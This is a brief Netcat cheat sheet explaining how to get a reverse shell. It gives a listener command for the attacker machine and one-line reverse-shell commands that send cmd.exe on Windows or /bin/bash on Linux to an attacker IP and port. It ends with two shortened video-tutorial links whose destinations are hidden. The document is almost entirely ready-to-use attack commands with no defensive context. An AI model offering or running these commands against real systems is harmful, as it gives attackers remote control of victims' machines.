## Setup a Netcat listener on the attacker machine

`nc -lvp port`

where `port` is any port number.

## To obtain a reverse shell for Windows

`nc.exe ip port –e cmd.exe`

## To obtain a reverse shell for Linux

`nc ip port –e /bin/bash`

where `ip` is the attacker machine IP and `port` is the chosen listening port.

## Video Tutorials

Win Reverse: https://goo.gl/bNxhbf
Linux Reverse: https://goo.gl/pwkJXB
